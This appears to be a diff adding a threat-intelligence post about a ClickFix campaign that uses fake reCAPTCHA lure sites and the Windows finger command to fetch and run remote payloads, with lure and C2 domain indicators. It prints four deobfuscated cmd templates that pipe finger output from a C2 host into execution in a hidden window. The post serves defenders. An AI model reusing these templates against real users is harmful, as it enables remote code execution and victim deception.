@@ -1,0 +1,46 @@
+2026-05-04 (MONDAY):Finger Protocol LOLBin C2 ClickFix Campaign
+
+Authors: Nabeel Mohamed, Billy Melicher and Oleksii Alex Starov
+
+NOTES:
+- The ClickFix campaign is active at the time of this threat post and operating with 12+ lure domains spanning four impersonation themes: AI content detectors background removal tools, PDF converters and a LinkedIn typosquat.
+- All sites share an identical clipboard injection with a fake reCAPTCHA, upon clicking which copies a base64 encoded script to the clipboard. 
+- The script is a cmd command abusing the finger protocol to fetch and execute a remote payload.
+- C2 infrastructure rotated across six domains over the campaign lifetime. The most follow a food-word naming convention (e.g. dailyhomreciple[.]com, steakhomireciple[.]com and cheeshomireciple[.]com), while LinkedIn lure page operated its own dedicated finger server at finger[.]liked-on[.]com).
+- Each C2 rotation is paired with a distinct finger username and “skip” value to get to the malicious instructions.
+
+DETAILS:
+- The finger command is a legitimate Windows binary rarely monitored by EDR or blocked by firewalls. Port 79/TCP is almost universally unfiltered, making this an effective C2 channel that bypasses proxy inspection. This attack shows the importance of monitoring this channel.
+- The campaign uses several techniques to hide the intention of the clipboard script. This includes showing several variants of the append “---Verify you are human.. Press ENTER–-” to the injected command and use a minimized window to hide the cmd window from the victim during payload retrieval and execution.
+- The distinct finger usernames used are lxjXZGpPHp, KqglRkqeNn, nrLeDHDESi, jLhHJgGrnH, EDZJTQUqTD, and AAQSdZqHWw. These usernames are uniquely used with each C2 domain.
+- Multiple lure domains share the save finger C2 server. For example, ai-detect[.]online, bg-removerok[.]online, backgroundformat[.]online, ai-scan[.]digital, pdfworker[.]online, and bg-ready[.]online used dailyhomreciple[.]com C2 server.
+- We observed pixel-perfect site cloning with lure pages. For example, background remover lure pages are indistinguishable from the legitimate remove.bg interface.
+- The overall execution chain is as follows: 1. The victim arrives at a lure page for free online tools. 2. Fake reCAPTCHA triggers clipboard injection upon clicking on which a base64 encoded cmd command abusing finger protocol is pasted to the clipboard. 3. The victim executes clipboard content by pressing Win+R and then entering. 4. Finger protocol retrieves the payload and executes on the victim’s machine with minimized windows.
+- We observed 4 distinct deobfuscated script templates:
+-- Simple with no echo prompt: start "" /min for /f "skip=8 delims=" %h in ('finger USER@C2') do call %h
+-- cmd /k with echo prompt: cmd /k start "" /min for /f "skip=8 delims=" %h in ('finger USER@C2') do call %h & exit && echo '---Verify you are human--------press ENTER---'
+-- cmd /k with wider whitespace in prompt: cmd /k start /min for /f "skip=8 delims=" %h in ('finger USER@C2') do call %h & exit && echo '               ---Verify you are human--------press ENTER---
+-- no cmd /k different skip number: start /min for /f "skip=14 delims=" %h in ('finger USER@C2') do call %h&exit && echo                ---Verify you are human--------press ENTER---
+
+IOCs:
+Lure Domains:
+- ai-detect[.]online
+- bg-removerok[.]online
+- backgroundformat[.]online
+- ai-scan[.]digital
+- pdfworker[.]online
+- pqrnews[.]com
+- bg-ready[.]online
+- linked-on[.]com
+- pdf-work[.]online
+- background-ready[.]online 
+- bg-go[.]online
+- bg-transparency[.]online
+
+C2 Domains:
+- dailyhomreciple[.]com 
+- steakhomireciple[.]com
+- cheeshomireciple[.]com
+- finger[.]linked-on[.]com
+- steakhomereciple[.]com
+- groceryhomrecipes[.]com
